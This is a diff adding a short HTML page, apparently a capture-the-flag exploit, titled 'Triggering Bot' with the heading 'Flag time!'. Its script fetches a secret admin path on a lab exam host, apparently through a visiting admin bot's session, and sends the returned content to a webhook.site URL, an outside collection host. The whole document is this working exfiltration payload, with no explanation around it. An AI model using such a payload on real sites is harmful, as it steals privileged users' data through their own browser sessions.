@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Triggering Bot</title>
+</head>
+<body>
+  <h1>Flag time!</h1>
+  <script>
+    fetch('https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/admin/sup3rs3cr3t')
+      .then(r => r.json())
+      .then(d => fetch('https://webhook.site/3ec63fbe-5406-4d1f-bb21-c10a9f6fe94b?data=' + encodeURIComponent(d.content)));
+  </script>
+</body>
+</html>
